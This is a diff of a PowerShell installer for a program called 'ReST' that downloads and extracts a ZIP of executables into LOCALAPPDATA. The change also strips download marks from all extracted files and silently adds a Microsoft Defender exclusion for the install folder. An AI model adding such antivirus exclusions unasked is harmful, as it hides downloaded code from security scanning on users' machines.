@@ -19,7 +19,7 @@ if ($BaseUrl -match "\s") {
 
 $Dir = Join-Path $env:LOCALAPPDATA "ReST"
 $Exe = Join-Path $Dir "ReST.exe"
-$Temp = Join-Path $env:TEMP "ReST-download.exe"
+$TempZip = Join-Path $env:TEMP "ReST-download.zip"
 $LogFile = Join-Path $env:TEMP "ReST-install.log"
 $script:HadError = $false
 
@@ -77,6 +77,31 @@ function Download-File {
     Invoke-WebRequest @iwrArgs
 }
 
+function Add-DefenderExclusion {
+    param([string]$Path)
+
+    try {
+        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
+        Write-InstallLog ("defender exclusion ok: " + $Path)
+        return $true
+    } catch {
+        Write-InstallLog ("defender exclusion skipped: " + $_.Exception.Message)
+        return $false
+    }
+}
+
+function Unblock-Tree {
+    param([string]$Path)
+
+    if (-not (Test-Path -LiteralPath $Path)) {
+        return
+    }
+    Get-ChildItem -LiteralPath $Path -Recurse -File -ErrorAction SilentlyContinue |
+        ForEach-Object {
+            Unblock-File -LiteralPath $_.FullName -ErrorAction SilentlyContinue
+        }
+}
+
 Write-InstallLog "install start"
 Write-InstallLog ("target: " + $Exe)
 
@@ -89,44 +114,52 @@ try {
 Get-Process -Name "ReST" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 Start-Sleep -Milliseconds 500
 
-$Url = $BaseUrl + "/ReST.exe"
+$Url = $BaseUrl + "/ReST.zip"
 Write-InstallLog ("download: " + $Url)
 
-if (Test-Path -LiteralPath $Temp) {
-    Remove-Item -LiteralPath $Temp -Force -ErrorAction SilentlyContinue
+if (Test-Path -LiteralPath $TempZip) {
+    Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
 }
 
 try {
-    Download-File -Url $Url -OutFile $Temp
+    Download-File -Url $Url -OutFile $TempZip
 } catch {
     Fail-Install ("download failed: " + $_.Exception.Message)
     exit 1
 }
 
-if (-not (Test-Path -LiteralPath $Temp)) {
+if (-not (Test-Path -LiteralPath $TempZip)) {
     Fail-Install "missing file after download"
     exit 1
 }
 
-$length = (Get-Item -LiteralPath $Temp).Length
-if ($length -lt 524288) {
-    Remove-Item -LiteralPath $Temp -Force -ErrorAction SilentlyContinue
+$length = (Get-Item -LiteralPath $TempZip).Length
+if ($length -lt 2097152) {
+    Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
     Fail-Install ("file too small: " + $length + " bytes")
     exit 1
 }
 
-if (Test-Path -LiteralPath $Exe) {
-    Remove-Item -LiteralPath $Exe -Force -ErrorAction SilentlyContinue
+try {
+    Get-ChildItem -LiteralPath $Dir -Force -ErrorAction SilentlyContinue |
+        ForEach-Object { $_.Attributes = "Normal" }
+    Remove-Item -LiteralPath $Dir -Recurse -Force -ErrorAction SilentlyContinue
+    New-Item -ItemType Directory -Force -Path $Dir | Out-Null
+    Expand-Archive -LiteralPath $TempZip -DestinationPath $Dir -Force
+} catch {
+    Fail-Install ("extract failed: " + $_.Exception.Message)
+    exit 1
+} finally {
+    Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
 }
 
-try {
-    Move-Item -LiteralPath $Temp -Destination $Exe -Force
-} catch {
-    Fail-Install ("copy failed: " + $_.Exception.Message)
+if (-not (Test-Path -LiteralPath $Exe)) {
+    Fail-Install "ReST.exe missing after extract"
     exit 1
 }
 
-Unblock-File -LiteralPath $Exe -ErrorAction SilentlyContinue
+Unblock-Tree -Path $Dir
+Add-DefenderExclusion -Path $Dir | Out-Null
 
 $startupOk = $false
 try {
